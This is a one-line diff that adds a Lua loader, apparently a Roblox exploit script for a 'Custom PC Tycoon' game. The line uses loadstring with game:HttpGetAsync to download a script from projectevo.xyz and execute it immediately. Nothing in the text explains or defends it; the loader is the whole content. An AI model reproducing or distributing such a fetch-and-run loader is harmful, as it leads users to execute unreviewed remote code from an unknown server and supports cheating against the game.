@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://projectevo.xyz/v3/releases/custompctycoon.lua", true))()
